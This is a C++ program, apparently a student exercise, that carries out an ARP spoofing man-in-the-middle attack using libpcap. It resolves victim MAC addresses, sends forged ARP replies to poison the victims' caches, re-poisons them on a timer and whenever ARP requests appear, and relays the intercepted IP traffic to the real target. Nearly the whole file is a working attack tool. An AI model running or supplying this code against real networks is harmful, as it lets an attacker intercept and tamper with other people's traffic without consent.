#include <cstdio>
#include <vector>
#include <stdint.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <time.h>
using namespace std;

struct eth_header {
    u_char eth_dmac[6];             /* ether destination (MAC) Address (6 Byte) */
    u_char eth_smac[6];             /* ether source (MAC) Address (6 Byte)*/
    u_short eth_type;               /* ether type (2 Byte) */
};
 
struct arp_header {
    u_short arp_hwtype;             /* Hardware Type (2 byte) */
    u_short arp_protype;            /* Protocol Type (2 Byte) */
    u_char arp_hlen;                /* Hardware Length (1 Byte) */
    u_char arp_plen;                /* Protocol Length (1 Byte) */
    u_short arp_opr;                /* Operation (2 Byte) */
    u_char arp_shwaddr[6];          /* Sender Hardware (MAC) Address (6 Byte) */
    u_char arp_sipaddr[4];          /* Sender Protocol(IP) Address (4 Byte) */
    u_char arp_thwaddr[6];          /* Target Hardware (MAC) Address (6 Byte) */
    u_char arp_tproaddr[4];         /* Target Protocol (IP) Address (4 Byte) */
};
 
struct eth_arp_reply {
    eth_header eth;
    arp_header arph;
};

struct info{
    uint8_t senderMac[6],targetMac[6];
    uint8_t senderIP[4],targetIP[4];
};
vector<info> vc;
eth_arp_reply reply;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;
eth_header eth;
arp_header arph;
uint8_t myMac[6],myIP[4];

void findMyMac(unsigned char add[]){
    struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int success = 0;

	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock == -1) { /* handle error*/ };

	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = 
	it + (ifc.ifc_len / sizeof(struct ifreq));

	for (; it != end; ++it) {
	    strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }
    if (success) memcpy(add, ifr.ifr_hwaddr.sa_data, 6);
}

void attack(int x)
{
    memcpy(eth.eth_smac, myMac, sizeof(myMac));
    eth.eth_type = htons(ETH_P_ARP);
    arph.arp_hwtype = htons(ARPHRD_ETHER);
    arph.arp_protype = htons(ETH_P_IP);
    arph.arp_hlen = sizeof(eth.eth_dmac);
    arph.arp_plen = sizeof(arph.arp_sipaddr);
    arph.arp_opr = htons(ARPOP_REPLY);
    memcpy(arph.arp_shwaddr, myMac, sizeof(myMac));

    // spoof sender
    memcpy(eth.eth_dmac, vc[x].senderMac, sizeof(vc[x].senderMac));
    memcpy(arph.arp_sipaddr, vc[x].targetIP, sizeof(vc[x].targetIP));
    memcpy(arph.arp_thwaddr, vc[x].senderMac, sizeof(vc[x].senderMac));
    memcpy(arph.arp_tproaddr, vc[x].senderIP, sizeof(vc[x].senderIP));
 
    reply.eth = eth;
    reply.arph = arph;
    if (pcap_sendpacket(handle,(const u_char*)&reply ,(sizeof(reply))) != 0){
        printf("Error - attacking :%s\n",pcap_geterr(handle));
    }

    return;
}

int main(int argc, char* argv[])
{
    char *dev = argv[1];

    // find my IP
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ); 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("IP address Error\n");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
    }

    findMyMac(myMac);

    int j=0;
    for(int i=0; i<strlen(ipstr); i++){
	if(ipstr[i]=='.') j++;
	else myIP[j]=myIP[j]*10+ipstr[i]-'0';
    }
    
    info in;

    for(int z=2; z<argc; z+=2){
	j=0;
	for(int i=0; i<4; i++) in.senderIP[i]=in.targetIP[i]=0;
	for(int i=0; i<6; i++) in.senderMac[i]=in.targetMac[i]=0;

	// find senderIP
	for(int i=0; i<strlen(argv[z]); i++){
	    if(argv[2][i]=='.') j++;
	    else in.senderIP[j]=in.senderIP[j]*10+(argv[z][i]-'0');
	}
	// find targetIP
	j=0;
	for(int i=0; i<strlen(argv[z+1]); i++){
	    if(argv[3][i]=='.') j++;
	    else in.targetIP[j]=in.targetIP[j]*10+(argv[z+1][i]-'0');
	}

	if(!(dev = pcap_lookupdev(errbuf))) {   
	    printf("%s", errbuf); return -1;
	}
 	
	// find senderMac
	for(int i=0; i<6; i++) eth.eth_dmac[i]=0xFF;
	memcpy(eth.eth_smac, myMac, sizeof(myMac));
	eth.eth_type = htons(ETH_P_ARP);
	arph.arp_hwtype = htons(ARPHRD_ETHER);
	arph.arp_protype = htons(ETH_P_IP);
	arph.arp_hlen = sizeof(eth.eth_dmac);
	arph.arp_plen = sizeof(arph.arp_sipaddr);
	arph.arp_opr = htons(ARPOP_REQUEST);
	memcpy(arph.arp_shwaddr, myMac, sizeof(myMac));

	memcpy(arph.arp_sipaddr, myIP, sizeof(myIP));
	for(int i=0; i<6; i++) arph.arp_thwaddr[i]=0;
	memcpy(arph.arp_tproaddr, in.senderIP, sizeof(in.senderIP));
 
	handle = pcap_open_live(dev, BUFSIZ, 1, 50, errbuf);
	if (handle == NULL) {
	    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	    return -1;
	}

	reply.eth = eth;
	reply.arph = arph;
    
	if (pcap_sendpacket(handle,(const u_char*)&reply ,(sizeof(reply))) != 0){
	    printf("pcap_sendpacket error\n");
	}
    
	while(true){
	    struct pcap_pkthdr* header;
	    const u_char* packet;
	    int res = pcap_next_ex(handle, &header, &packet);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    if(packet[12]!=0x08 || packet[13]!=0x06) continue;  // check if arp
	    if(packet[20]!=0x00 || packet[21]!=0x02) continue;  // check if reply
	    int check=1;
	    for(int i=0; i<4; i++) if(packet[38+i]!=myIP[i]) check=0;
	    if(check==0) continue;      // check if myIP
	    for(int i=0; i<6; i++) in.senderMac[i]=packet[i+6];    // found senderMac
	    break;
	}

	// find targetMac
	memcpy(arph.arp_tproaddr, in.targetIP, sizeof(in.targetIP));
	reply.arph=arph;
	if (pcap_sendpacket(handle,(const u_char*)&reply ,(sizeof(reply))) != 0){
	    printf("pcap_sendpacket error\n");
	}
    
	while(true){
	    struct pcap_pkthdr* header;
	    const u_char* packet;
	    int res = pcap_next_ex(handle, &header, &packet);
	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    if(packet[12]!=0x08 || packet[13]!=0x06) continue;  // check if arp
	    if(packet[20]!=0x00 || packet[21]!=0x02) continue;  // check if reply
	    int check=1;	    
	    for(int i=0; i<4; i++) if(packet[38+i]!=myIP[i]) check=0;
	    if(check==0) continue;       // check if myIP
	    for(int i=0; i<6; i++) in.targetMac[i]=packet[i+6];    // found targetMac
	    break;
	}

	vc.push_back(in);
    }

    // first attack
    for(int i=0; i<vc.size(); i++) attack(i);

    clock_t t1=clock();
    // re-attack
    while(1){
	// re-attack ( time )
	clock_t t2=clock();	
	if((int)t2-(int)t1>1000){
	    for(int i=0; i<vc.size(); i++) attack(i);
	    t1=clock();
	}

	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_next_ex(handle, &header, &packet);
	if (res == 0) continue;   // timeout
	if (res == -1 || res == -2) break;	
	
	// reattack ( packet detected )
	if(packet[12]==0x08 && packet[13]==0x06){  // if arp
	    if(packet[20]==0x00 && packet[21]==0x01){  // check if request
		int check=1;
		for(int i=0; i<6; i++) if(packet[i]!=0xff) check=0;
		if(check==1){
		    for(int i=0; i<vc.size(); i++) attack(i);
		}
		for(int i=0; i<vc.size(); i++){
		    check=1;
		    for(j=0; j<6; j++) if(packet[6+j]!=vc[i].senderMac[j]) check=0;
		    for(j=0; j<4; j++) if(packet[38+j]!=vc[i].targetIP[j]) check=0;
		    if(check==1) attack(i);
		}
	    }
	}

	// relay
	else if(packet[12]==8 && packet[13]==0){ // if IP
	    for(int i=0; i<vc.size(); i++){
		int check=1;
		for(j=0; j<6; j++) if(packet[6+j]!=vc[i].senderMac[j]) check=0;
		if(check==1){
		    int packlen=header->caplen;
		    u_char* pack=(u_char*) malloc(packlen);
                    for(j=0; j<packlen; j++) pack[j]=packet[j];
		    for(j=0; j<6; j++) pack[6+j]=myMac[j];
		    for(j=0; j<6; j++) pack[j]=vc[i].targetMac[j];
		    if (pcap_sendpacket(handle,(const u_char*)pack,packlen) != 0){
			printf("Error - relaying :%s\n",pcap_geterr(handle));
		    }
		    free(pack);
		}
	    }
	}
    }
}



